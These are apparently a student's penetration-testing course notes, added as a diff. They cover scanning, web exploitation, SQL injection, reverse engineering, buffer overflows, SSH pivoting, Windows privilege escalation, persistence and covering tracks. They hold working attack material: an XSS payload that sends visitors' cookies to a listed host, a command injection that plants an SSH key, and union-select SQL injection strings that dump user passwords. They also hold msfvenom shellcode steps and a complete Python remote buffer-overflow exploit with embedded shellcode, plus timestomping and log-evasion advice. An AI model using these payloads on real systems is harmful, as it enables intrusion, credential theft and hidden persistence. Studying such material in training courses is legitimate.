@@ -1,0 +1,1007 @@
+This gets rid of the green unclassified bar
+
+
+ps -aux | grep classif
+kill <first number in the top left corner>
+
+
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+
+Penetration Test (Pen Test)
+Pen Test Report
+    • Executive
+        ◦ for the executives
+        ◦ Just the brief things not exact details
+    • Technical
+        ◦ Go into full detail, commands used, for the people that work for a living 
+    • Reason to report something
+        ◦ If you find a vulnerability or just after every mission
+    • What to report
+        ◦ Make what you did sound important and good
+
+Vulnerability and Exploitation Research
+    • Host Discovery (Find hosts that are online)
+        ◦ Ping Sweep
+        ◦ nmap
+    • Host Enumeration (Find ports that are up)
+        ◦ nmap
+    • Host Interrogation (Discover what services are running on the open ports)
+        ◦ Banner Grabbing (nc(mainly) and nmap(backup))
+
+NMAP Scripting Engine
+    • Benefits of Scanning with Scripts
+    • Script Management and Utilization
+    • Usage and Examples
+
+NMAP Scripts
+    • /usr/share/nmap/scripts
+      
+    • nmap --script <filename>|<category>|<directory>
+    • nmap --script-help "ftp-* and discovery"
+      
+    • nmap --script-args <args>
+    • nmap --script-args-file <filename>
+      
+    • nmap --script-help <filename>|<category>|<directory>
+      
+    • nmap –script-trace
+
+nmap -Pn -T4 --min-rate=999999999999999 <IP or SUBNET> -p-
+
+--script=http-enum
+    • This will enumerate HTTP and give possible information thats on the website
+--script=http-robots.txtBlu
+    • Use this one
+--script=smb-os-discovery
+    • If port 445 or 135 or 139 open, this will do a possible host discovery and confirm that SMB is open, ONLY FOR WINDOWS BOX
+
+445, 9999, 3389
+    • Ports that would be open on a windows device, If you see one of these more than likely windows
+
+for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+
+WEB EXPLOITATION
+Server/Client Relationship
+    • Synchronous communications between user and services
+    • All data is not returned, client only receives what is allowed
+
+HTTP
+Request/Reply
+    • Various tools to view; tcpdump. Wireshark, dev console
+GET / HTTP/1.1
+HTTP/1.1 200 OK
+
+HTTP Methods
+    • GET (When you type google.com into the URL bar)
+    • HEAD
+    • POST (When you go onto google.com and conduct a search with the search bar)
+    • PUT
+HTTP RESPONSE CODES
+    • 10X == Informational
+    • 2XX == Success
+    • 30X == Redirection
+    • 4XX == Client Error
+    • 404 == Resource Not Found
+    • 5XX == Server Error
+HTTP FIELDS
+    • User-Agent
+    • Referer
+    • Cookie
+    • Date
+    • Server
+    • Set-Cookie
+WGET
+    • Recursive download, recover from broken transfers, SSL/TLS support
+wget -r -l2 -P /tmp ftp://ftpserver/
+-l2 = Only go however many layers stated deep
+-P = Allows you to save it
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
+--save-cookies = Save the cookies to a file stated
+--keep-session-cookies = Keep session cookies
+--post-data = Makes wget be a POST request
+wget --load-cookies cookies.txt -p http://....com/interesting/article.php
+--load-cookies = Load cookies from a file stated
+CURL
+    • Not recursive, can use pipes, Upload ability
+    • Supports more protocols vs WGET such as SCP, POP3
+curl -o stuff.html http://website/stuff.html
+curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+-H = Makes an HTML header
+HYPERTEXT MARKUP LANGUAGE (HTML)
+Standardized markup language for browser interpretation of web pages
+    • Client side interpretation (web browser)
+    • Utilizes elements which are identified by tags
+    • Typical refers another "page" for server side interaction
+    • Cascading Stylesheet (CSS) for page theme
+JAVASCRIPT (JS)
+    • Allows websites to interact with the client
+        ◦ JavaScript runs on the client’s machine
+        ◦ Coded as .js files or in line with HTML
+ENUMMERATION
+    • Robots.txt (For web spiders, what web spiders do is they index things)
+    • Legitimate surfing
+    • Tools: NSE scripts, nikto, Burp suite
+    • NSE
+    • NIKTO: 
+        ◦ sudo apt install nikto
+        ◦ nikto -h <Whatever host>
+CROSS-SITE SCRIPTING (XSS)OVERVIEW
+    • Insertion of arbitrary code into a web page that executes in the browser of visitors
+    • Unsanitized GET, POST, and PUT methods allow JS to operate on websites
+    • It is often found in forums that allow HTML
+    • In a perfect world this would never work, but people are lazy so it works occationally
+REFLECTED XSS
+    • The most common form of XSS
+        ◦ Sgt is not sure if this is true still
+    • Transient, occurs in error messages or search result
+    • Delivered through intermediate media, such as a link in an email.
+    • Characters that are normally illegal in URLs can be base64 encoded
+    • Won’t really do this much
+SECURITY THROUGH SECURITY DOES NOT WORK
+“TELL ANYONE THAT SAYS IT DOES TO LOOK IN THE MIRROR” said Sgt Wilson
+
+STORED XSS
+    • Resides on vulnerable site (iframe)
+    • Only requires user to visit page
+    • A little harder than reflected because it’s stored on the website
+USEFUL JAVASCRIPT COMPONENTS
+Proof of concept; simple alert :
+<script>alert(“cap”);</script>
+This will tell you if it’s vulnerable to XSS scripting(Try it like 3 times)
+    • If vulnerable
+        ◦ Find where you can upload stuff at and where it goes
+        ◦ Upload your cookie stealer
+        ◦ Upload blank cookiefile
+
+<script>document.location=”http://10.100.28.40/uploads/cookie_stealer.php?username=”+documents.cookie;</script>
+SERVER-SIDE INJECTION
+Directory Traversal/Path Traversal
+    • Ability to read/execute outside web server’s directory
+    • uses ../../ (absolute paths) in manipulating variables
+view_image.php?file=../../etc/passwd
+../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/paswd
+MALICIOUS FILE UPLOAD
+Site allows unsanitized file uploads.
+    • Server doesn’t validate extension or size
+    • Allows for code execution → shell
+    • Once uploaded, find your file, call your file
+COMMAND INJECTION
+    • Application on the server is vulnerable by allowing execution of arbitrary data.
+        ◦ Again, user input not validated
+        ◦ SOHO router with a web page to do ping
+Could contain the below in its code:
+    • system("ping -c 1 ".$_GET["ip"]);
+Pass below to chain/stack our arbitrary command
+    • ; cat /etc/passwd
+Default User for a Web Server
+    • www-data
+
+ssh-keygen -t rsa -b 4096
+    • ssh-keygen = The command
+    • -t = The type of key
+    • -b = Byte size (FAIRIES SAY ITS 4096!!!!!!)
+/var/www
+    • Home directory
+; echo “PUBLIC KEY” >> /var/www/.ssh/authorized_keys
+    • This will load your public key into the SSH authorized_keys folder remotly
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+WEB EXPLOITATION – SQL INJECTION
+SQL (MY SQL is the version we use!!!!!!!!!!)
+    • Structured Query Language - ANSI Standard
+    • Additional commands added by vendors
+    • Relational
+
+STANDARD COMMANDS
+USE			Select the DB you would like to use
+SELECT			Extracts data from a database
+UPDATE			Updates data in a database
+DELETE			Deletes data from a database
+INSERT INTO		Inserts new data into a database
+CREATE DATABASE		Creates a new datanase
+ALTER DATABASE		Modifies a database
+CREATE TABLE		Creates a new tables
+ALTER TABLE		Modifies a table
+DROP TABLE		Deletes a table
+CREATE INDEX		Create an index (search key)
+DROP INDEX		Deletes an index
+UNION			Used to combine the result-set of two or more SELECT statements
+
+Default Databases in every MySQL Server
+All SQL commands end in a ;
+    • information_schema
+        ◦ Important info
+    • performance_schema
+    • mysql
+    • User made ones usually have important stuff
+USE <NAME OF DB>
+
+SELECT <> FROM <>
+
+SQL INJECTION - CONSIDERATIONS
+    • Require Valid SQL Queries
+    • Fully patched systems can be vulnerable due to misconfiguration
+    • Input Field Sanitization
+    • String vs Integer Values
+    • Is information_schema Database available?
+        ◦ “Probably Gonna be there” says Sgt Wilson
+    • GET Request versus POST Request HTTP methods
+
+TEST EVERY OPTION AND EVERYTHING IN SQL FOR AN OPEN INPUT SPOT!!!!!!!!!!!!
+----------------------------------------------------------------------------------------------------------------------------
+select if where user=’<>’ and passwd=’<>’;
+POST way to see if SQL injection is possible
+    • python' or 1='1
+    • python” or 1=”1
+    • python or 1=1
+GET way to see if SQL injection is possible
+    • <URL>/<The Log in>.php?user=python' or 1='1 1&pass=python' or 1='1
+    • <URL>/<The Log in>.php?user=python” or 1=”1&pass=python” or 1=”1
+    • <URL>/<The Log in>.php?user=python or 1=1 = 1&pass=python or 1=1
+
+    • Log in using these steps to try it
+    • Once you get a successful time
+    • Go into network section of Dev Console
+    • Go into RAW mode
+    • Copy whats there
+    • Add the question mark and Paste what you copied
+
+
+IGNORE THE REST
+Using # or -- tells the Database to ignore everything after
+Server-side Query:
+    • SELECT product FROM item WHERE id = $select limit 1;
+Input to Inject:
+    • <VALUE> 1 or 1=1; #
+    • <VALUE> 1 or 1=1; --
+    •  
+Server-side Query becomes:
+    • SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+
+THERE MIGHT BE MORE THAN ONE THING VULNERABLE TO SQL INJECTION
+
+POST METHOD
+    • Test for vulnerability
+    • Test to see how many columns are in the database
+        ◦ Audi' UNION SELECT <The amount of columns that shows up when testing vulnerability in number form seperated by commas>; #
+        ◦ Increment by adding one until the query errors
+        ◦ Could be more than what you see when you find vulnerability or the same but never less
+    • GOLDEN STATEMENT
+        ◦ Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
+        ◦ table_schema = Databases
+        ◦ table_name = Tables within the Databases
+        ◦ column_name = Columns inside the Tables inside the Databases
+    • Refine the Golden Statement
+        ◦ Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns WHERE table_schema='session'; #
+    • Audi' UNION SELECT id,2,name,pass,5 FROM session.user;#
+
+GET METHOD
+    • Test for Vulnerability
+    • Play with the website
+    • Try each Option to see which one shows the best result
+        ◦ <Whatever variable may be>' or 1='1
+    • Golden Rule
+        ◦ http://10.50.39.57/uniondemo.php?Selection=4 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;#
+    • Refine Golden Rule
+        ◦ http://10.50.39.57/uniondemo.php?Selection=4 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns WHERE table_schema= session ;#
+
+    • This will give you the version of SQL 
+        ◦ 10.50.39.57/uniondemo.php?Selection=4 UNION SELECT @@version,2,3;#
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+REVERSE ENGINEERING
+X86_64 ASSEMBLY
+There are 16 general purpose 64 bit registers
+%rax			the first return register
+%rbp			the base pointer that keeps track of the base of the stack
+%rsp			the stack pointer that points to the top of the stack
+You will see arguments passed to functions as something like
+[%ebp-0x8]
+
+
+X86_64 ASSEMBLY - COMMON TERMS
+Heap			memory that can be allocated and deallocated
+Stack			a contiguous section of memory used for passing arguments (First in last out)
+General Register	dsrgh
+Control Register	seg
+Flags Register		se
+
+
+REVERSE ENGINEERING 
+1) Static Analysis
+	Pull the file into your box
+	Run the CMD file on the file to get what type of file it is
+	Run the CMD strings on the file to get ASCII strings out of it
+
+2) Behavioral Analysis
+	Run the file (see what it does, see the normal way it operates) 
+	Run the file on GHIDRA or IDA 	(WINDOWS)
+		Search for strings on that file
+	Run the file on GDB 		(LINUX)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+X86_64 ASSEMBLY - MEMORY OFFSET
+64-Bit			RIP
+Lower 32 Bits		EIP
+Lower 16 Bits		IP
+Description		Instruction Pointer; holds address for next instruction to be executed
+
+
+X86_64 ASSEMBLY - COMMON INSTRUCTION POINTERS
+MOV		move source to destination
+PUSH		push source onto stack
+POP		Pop top of stack to destination
+INC		Increment source by 1
+DEC		Decrement source by 1
+ADD		Add source to destination
+SUB		Subtract source from destination
+CMP		Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
+TEST		Same as CMP basically but for words 
+JMP		Jump to specified location
+JLE		Jump if less than or equal
+JE		Jump if equal
+LEA		Think of it as a MOV
+
+REVERSE ENGINEERING WORKFLOW (SOFTWARE)
+    • Static
+    • Behavioral
+    • Dynamic
+    • Disassembly
+    • Document Findings
+
+PORTABLE EXECUTABLE PATCHING / SOFTWARE ANALYSIS
+    • Perform Debugging and Disassembly
+    • Find the Success/Failure
+    • Adjust Instructions
+    • Apply Patch and Save
+    • Execute Patched Binary
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+PATCHING
+NO SLIDE DECK FOR THIS
+    1) Right Click
+        1) Patch Instruction
+    2) Switch command to the opposite and press enter
+    3) Export Program
+        1) <Name of file>_patch
+        2) Make sure its a portable executable
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------
+EXPLOIT DEVELOPMENT 
+“IS EASY … AS LONG AS YOU KNOW THE PROCESS” says Sgt Wilson
+BUFFER OVERFLOW COMMON TERMS
+    • Heap - memory that can be allocated and deallocated
+    • Stack - a contiguous section of memory used for passing arguments (First in last out)
+    • Registers - Storage elements as close as possible to the central processing unit (CPU)
+    • Instruction Pointer (IP) - AKA Program Counter (PC) contains the address of next instruction to be executed
+    • Stack Pointer (SP) - Contains the address of the next available space on the stack
+    • Base Pointer (BP) - The base of the stack
+    • Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient (Block of Code)
+    • Shellcode - The code that is executed once an exploit successfully takes advantage of a vulnerability (Code that gives you a shell)
+
+
+BUFFER OVERFLOW DEFENSES
+    • Non executable (NX) stack
+        ◦ 
+    • Address Space Layout Randomization (ASLR)
+        ◦ Find the next available stack pointer and use that as the instruction pointer
+    • Data Execution Prevention (DEP)
+        ◦ 
+    • Stack Canaries
+        ◦ Piece of code that watches over everything that has a password and only lets thing execute with that  password
+    • Position Independent Executable (PIE)
+        ◦ This is an algorithm that will 
+
+TECHNICAL HELP
+Utilizing tools such as:
+    • IDA, GHIDRA
+    • GDB, MONA, IMMUNITY
+    • BASH, PYTHON
+
+
+Buffer Overflow steps
+    1) Run it to get an idea of what happens
+    2) Attempt a buffer overflow 
+        (a) If you get a Segmentation Fault it can be done
+    3) Use GDB
+        (a) gdb <the executable in question>
+    4) pdisass main
+        (a) Don’t worry about <__x86.get_pc_thunk.ax>
+    5) pdisass <Function in question>
+        (a) RED and UNDERLINE means vulnerable
+    6) Vulnerability Research if multiple things are RED and UNDERLINED
+        (a) To figure out which one is vulnerable to Buffer Overflow
+    7) Once you figure out which function is vulnerable
+    8) Create script to run
+        (a) ./<FILE NAME> <<< $(python things.py)		# If it takes user input
+        (b) ./<FILE NAME> $(python things.py)			# If it requires a parameter
+    9) Once you get those to work
+        (a) run <<< $(python things.py)				# For running inside GDB
+    10) Once into the GDB 
+	(a) Go up to EIP and copy the Hex value into special site and get correct offset
+    11) Go into script and test the number you get to make sure its actually the Instruction Pointer
+        (a) By updating the offset value to the value gained from the special site and add another variable that will show it’s correctly written over the Instruction Pointer
+    12) Need to find a valid Instruction Pointer
+        (a) Stack Pointer
+    13) Open GDB with nothing else
+        (a) env -gdb <Executable Name>
+    14) Unset every environment variable with GDB
+        (a) unset env <Name of variables>
+        (b) Makes GDB very vanilla
+    15) Cause a buffer overflow
+    16) info proc map
+        (a) HAS TO BE DONE ON TARGET DEVICE
+    17) Grab Memory address right below the HEAP from column on the left
+    18) Grab Memory address right above the STACK from column on the right
+    19) find /b <HEAP VALUE>, <STACK VALUE>, 0xff, 0xe4
+        (a) 0xff, 0xe4 		# These will never change 
+        (b) 0xff 			# JMP
+        (c) 0xe4 			# ESP
+    20) The EIP must be swapped backwards
+    21) msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python
+        (a) Trouble Shooting Step
+        (b) -b 		# Means Bad Character
+        (c) ‘\x00’ 		# Is a null byte
+        (d) -f 		# Means Format
+        (e) msfvenom -p linux/x86/exec CMD="hostname" -b '\x00' -f python
+        (f) msfvenom -p linux/x86/exec CMD="sudo -l" -b '\x00' -f python
+        (g) msfvenom -p linux/x86/exec CMD="sudo cat <file path>" -b '\x00' -f python
+    22) Add the ShellCode into the script with new variable and add it into the print
+    23) Add a nop variable into the script and make there be 10 of them 
+        (a) nop = ‘\x90’ *10
+        (b) If 10 doesn’t work double the 10
+        (c) This goes between EIP and BUF in print statementgd
+    24) RUN YO SHIT MY BOI!!!!!!!!!!!
+
+Trouble Shooting Steps
+    1) First thing to trouble shoot is double the nop to 20
+    2) Second thing is to double check all of your programming for any errors or reuse of variables
+        1. Print line should be (buff + eip + nop + buf) or (buf) if you set everything as the same variable and declared them as "buf = <ANYTHING>" and "buf += <ANYTHING>" for everything after declaring buf
+    3) Third thing is to regenerate your ShellCode
+    4) Fourth thing is pick a new JMP ESP.
+    5) Fifth thing HOPE YOU NEVER MAKE IT THIS FAR BECAUSE YOU GOTTA RESTART
+
+
+
+(EIP) Instruction Pointer in a 32 bit program is 4 bytes long
+When running it inside of GDB its just run instead of saying the executable name
+
+WINDOWS REMOTE SCRIPT
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 2003
+buf += "\xa0\x12\x50\x62"
+buf += "\x90" * 20
+buf += b"\xdb\xc5\xd9\x74\x24\xf4\xbe\x05\xbb\x95\x2f\x5a\x2b"
+buf += b"\xc9\xb1\x59\x31\x72\x19\x03\x72\x19\x83\xea\xfc\xe7"
+buf += b"\x4e\x69\xc7\x68\xb0\x92\x18\x16\x38\x77\x29\x04\x5e"
+buf += b"\xf3\x18\x98\x14\x51\x91\x53\x78\x42\xa6\xd4\x37\x4c"
+buf += b"\x33\x68\xe0\xa1\xbc\xbd\x30\x6d\x7e\xdc\xcc\x6c\x53"
+buf += b"\x3e\xec\xbe\xa6\x3f\x29\x09\xcc\xd0\xe7\x01\x7c\x3e"
+buf += b"\x83\x54\xbd\x3f\x43\x0f\x36\x7f\x1b\x35\x88\x0b\x97"
+buf += b"\x34\xd9\x78\x6f\x2f\x89\xf5\x28\x6f\x28\xda\x4c\xa6"
+buf += b"\x5e\xe0\x07\xb2\xab\x93\x99\x12\xe2\x5c\xa8\x5a\xa9"
+buf += b"\x63\x04\x57\xb3\xa4\xa3\x88\xc6\xde\xd7\x35\xd1\x25"
+buf += b"\xa5\xe1\x54\xb9\x0d\x61\xce\x1d\xaf\xa6\x89\xd6\xa3"             
+buf += b"\x03\xdd\xb0\xa7\x92\x32\xcb\xdc\x1f\xb5\x1b\x55\x5b"
+buf += b"\x92\xbf\x3d\x3f\xbb\xe6\x9b\xee\xc4\xf8\x44\x4e\x61"
+buf += b"\x73\x66\x99\x15\x7c\x78\xa6\x4b\xea\xb4\x6b\x74\xea"
+buf += b"\xd2\xfc\x07\xd8\x7d\x57\x80\x50\xf5\x71\x57\xe1\x11"
+buf += b"\x82\x87\x49\x71\x7c\x28\xa9\x5b\xbb\x7c\xf9\xf3\x6a"
+buf += b"\xfd\x92\x03\x92\x28\x0e\x0e\x04\xd9\xfc\x2d\x09\xb5"
+buf += b"\x02\x32\xb5\x94\x8b\xd4\xe5\x48\xdb\x48\x46\x39\x9b"
+buf += b"\x38\x2e\x53\x14\x66\x4e\x5c\xff\x0f\xe5\xb3\xa9\x78"
+buf += b"\x92\x2a\xf0\xf3\x03\xb2\x2f\x7e\x03\x38\xc5\x7e\xca"
+buf += b"\xc9\xac\x6c\x3b\xae\x4e\x6d\xbc\x5b\x4e\x07\xb8\xcd"
+buf += b"\x19\xbf\xc2\x28\x6d\x60\x3c\x1f\xee\x67\xc2\xde\xc6"
+buf += b"\x1c\xf5\x74\x66\x4b\xfa\x98\x66\x8b\xac\xf2\x66\xe3"
+buf += b"\x08\xa7\x35\x16\x57\x72\x2a\x8b\xc2\x7d\x1a\x7f\x44"
+buf += b"\x16\xa0\xa6\xa2\xb9\x5b\x8d\xb0\xbe\xa3\x53\x9f\x66"
+buf += b"\xcb\xab\x9f\x96\x0b\xc6\x1f\xc7\x63\x1d\x0f\xe8\x43"
+buf += b"\xde\x9a\xa1\xcb\x55\x4b\x03\x6a\x69\x46\xc5\x32\x6a"
+buf += b"\x65\xde\xc5\x11\x06\xe1\x26\xe6\x0e\x86\x27\xe6\x2e"
+buf += b"\xb8\x14\x30\x17\xce\x5b\x80\x2c\xc1\xee\xa5\x05\x48"
+buf += b"\x10\xf9\x56\x59"
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect(("192.168.150.245", 9999))
+print s.recv(1024)
+s.send(buf)
+s.close()  
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------CONTROL SOCKETS
+Two ways
+    • T10 way and Automatic way
+Multiplexing = Master
+Save = Slave
+
+Manual Way
+    1) First thing you gotta do is find a place to save your sockets
+    2) Put it into .ssh directory which is inside home directory
+    3) Make a directory for your sockets to stay organized
+    4) ssh -M -S /home/student/.ssh/cm/%r@%h:%p student@10.50.40.73
+        a) This will just set up an SSH to the gray host or IP specified
+        b) This will allow you to use this one SSH for multiple ways 
+            I. Use this command from inside the directory just made to create the socket 
+            II. Just change the IPs and File path if moving the directory you are saving the socket at
+    5) ssh -o "ControlPath=/home/student/.ssh/cm/student@10.50.40.73:22" gray
+        a) gray is just a name for the connection
+        b) This will allow you to access the socket 
+    6) ssh -O forward -L 1111:192.168.28.120:4242 -S /home/student/.ssh/cm/student@10.50.40.73:22 gray
+        a) The name does not have to stay the same as the previous one
+    7) ssh -O forward -L 2222:192.168.28.105:2222 -S /home/student/.ssh/cm/student@10.50.40.73 gray
+        a) This is how you create another tunnel to another hop using the same socket created
+    8) ssh -O cancel -L 2222:192.168.28.105:2222 -S /home/student/.ssh/cm/student@10.50.40.73 gray
+        a) By changing the forward to cancel is how you end the session and connection from showing in the connections or listening ports
+    9) ssh -M -S /home/student/.ssh/cm/%r@%h:%p student@0.0.0.0 -p 1111 
+        a) This will allow you to set up a socket to go through another socket made to get to devices on the other side of it
+
+Automatic Way
+    1) vim /home/student/.ssh/config
+       Host gray 			# Allows for the use of just this name and not the IP
+           HostName 10.50.40.73
+           ControlPath /home/student/.ssh/cm/gray
+           ControlMaster auto	# Can be set as auto or yes
+           ControlPersist 10m	# Keep this at a low number, this will help with hanging connections
+    1) ssh -O forward -L 1111:10.50.22.27:22 -S ~/.ssh/cm/gray T1
+        a) This is the command to set up an original socket 
+    2)  ssh -O forward -L 2222:10.50.39.57:22 -S ~/.ssh/cm/gray T2
+        a) This is the command to use if you want to set up a second hop
+
+Host gray                                                                                  
+    HostName 10.50.40.73
+    ControlPath /home/student/.ssh/cm/gray
+    ControlMaster auto
+    ControlPersist 10m 
+Host *
+    ControlPath /home/student/.ssh/cm/%r@%h:%p
+    ControlMaster auto
+    ControlPersist 10m
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------POST EXPLOITATION
+Pivoting & Redirection
+    • Control Sockets
+    • Enumeration
+    • Exfiltration
+
+SSH OVERVIEW
+Basic Characteristics:
+    • Access remote systems using an SSH server as a proxy
+    • Securely transfer files
+    • Execute commands on a remote system
+    • VPN using the SSH protocol as a transport
+    • Forwarding the X Window System display to the client system
+
+WINDOWS TARGETS
+    • netsh interface portproxy add v4tov4 listenport=<LocalPort> listenaddress=<LocalIP> connectport=<TargetPort> connectaddress=<TargetIP> protocol=tcp
+    • netsh interface portproxy show all
+    • netsh interface portproxy delete v4tov4 listenport=<LocalPort>
+    • netsh interface portproxy reset
+
+LOCAL HOST ENUMERATION
+USER ENUMERATION
+net user 			(WINDOWS)
+cat /etc/passwd 		(LINUX)
+
+PROCESS ENUMERATION
+tasklist /svc 			(WINDOWS)
+ps -elf 			(LINUX)
+
+SERVICE ENUMERATION
+tasklist /svc 			(WINDOWS)
+chkconfig 			(LINUX)
+
+NETWORK CONNECTION ENUMERATION
+ipconfig /all 			(WINDOWS)
+ifconfig -a 			(LINUX)
+
+DATA EXFILTRATION
+Logging 
+    • | tee
+
+Encryption
+Transport Methods
+    • scp
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------WINDOWS PRIVILEGE ESCALATION & PERSISTANCE
+MODES & LEVELS
+Modes
+    • Kernel Mode
+    • User Mode
+Levels
+    • Privileged
+    • Unprivileged
+WINDOWS ACCESS CONTROL MODEL
+Access Tokens
+Security Identifier (SID) associations and Token associations
+    • Security Descriptors:
+        ◦ DACL
+        ◦ SACL
+        ◦ ACEs
+            ▪ Holds info for DACL and SACL
+
+DLL SEARCH ORDER
+Executables check the following locations:
+    • HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+    • The directory the the Application was run from
+    • The directory specified in in the C+ function GetSystemDirectory()
+    • The directory specified in the C+ function GetWindowsDirectory()
+    • The current directory
+
+WINDOWS INTEGRITY MECHANISM
+Integrity Levels
+    • Untrusted - Anonymous SID access tokens
+    • Low - Everyone SID access token (World)
+    • Medium - Authenticated Users
+    • High - Administrators
+    • System - System services (LocalSystem, LocalService, NetworkService)
+
+USER ACCOUNT CONTROL (UAC)
+    • Always Notify
+    • Notify me only when programs try to make changes to my computer
+    • Notify me only when programs try to make changes to my computer (do not dim my desktop)
+    • Never notify
+
+CHECKING UAC SETTINGS
+    • reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+    • Can also just use reg editor and go to this path
+
+AUTOELEVATE EXECUTABLES
+Requested Execution Levels:
+    • asInvoker
+    • highestAvailable
+
+SCHEDULED TASKS & SERVICES
+    • Items to evaluate include:
+    • Write Permissions
+    • Non-Standard Locations
+    • Unquoted Executable Paths
+    • Vulnerabilities in Executables
+    • Permissions to Run As SYSTEM
+
+FINDING VULNERABLE SCHEDULED TASKS
+    • schtasks /query /fo LIST /v
+    • Use the GUI if you have one to view scheduled tasks
+
+DLL HIJACKING
+    • Identify Vulnerability
+    • Take advantage of the default search order for Dll
+    • NAME_NOT_FOUND present in executables system calls
+    • Validate permissions
+    • Create and transfer Malicious Dll
+
+FINDING VULNERABLE SERVICES
+    • wmic service list full
+
+VULNERABLE SERVICES
+    • Identify Vulnerability
+    • Validate permissions
+    • Validate Executable Paths
+    • Replace with Malicious File
+
+OTHER VULNERABILITIES
+    • Unpatched Kernel Vulnerabilities
+    • Unpatched Systems
+    • Unpatched Applications
+
+SYSTEM ACCESS AND DEFEATING PROTECTIONS
+The objective of this is to provide yourself unrestricted access to a system, and identify methods to execute malicious activity through a basic command line prompt.
+    • Sysinternals
+    • Schedule Task
+    • UAC Bypass
+
+PERSISTANCE
+System changes or binary uploads that provide adversary continued access to system.
+Survives:
+Reboots, Credential changes, DHCP IP reassignment, Etc.
+    • Considerations include:
+        ◦ File naming
+        ◦ File location
+        ◦ Timestomping
+        ◦ Port selection
+
+REGISTRY
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
+    • Run
+    • RunOnce
+
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\``
+    • Run
+    • RunOnce
+
+SERVICES
+    • At Startup
+    • Perform Multiple Functions
+    • Typically require Administrative Access
+
+COVERING TRACKS
+When does planning start?
+    • Prior, after, before == know the system
+        ◦ What will happen if I do X == logs
+        ◦ Checks == where are things
+        ◦ Hide == file locations, names, times
+
+CONSIDERATIONS
+    • Artifacts
+        ◦ Determine which events will create a log
+        ◦ Event logging: Applications, Security, Setup, System
+    • Blending In
+    • TimeStomping
+
+SYSTEM USAGE
+Where should you run commands from?
+    • Locally
+    • Remotely
+Are system resources important, and how can we check them?
+
+    • wmic, net, netstat
+AUDIT LOGGING
+Shows all audit category setting
+    • auditpol /get /category:*
+What does the below command show?
+    • auditpol /get /category:* | findstr /i "success failure"
+MICROSOFT EVENT IDS (SOME IMPORTANT ONES)
+    • 4624/4625 successful/failed login
+    • 4720 account created
+    • 4672 administrator equivalent user logs on
+    • 7045 Service creation
+
+
+
+EVENT LOGGING
+Storage: c:\windows\system32\config\ FileType: .evtx/.evt
+    • wevtutil el
+    • wmic ntevent where "logfile="<LOGNAME>" list full
+    • Get-Eventlog -List
+
+POWERSHELL LOGGING
+    • Windows CLI CMD history is per instance (doskey /history)
+    • Powershell can be set to log sessions
+        ◦ 2.0 little evidence == nothing about what was executed
+        ◦ 3.0 Module logging (EventID 4103)
+        ◦ 4.0 Module logging
+        ◦ 5.0 Can set module, script block (EvnetID 4104) and transcription
+
+ADDITIONAL LOGGING
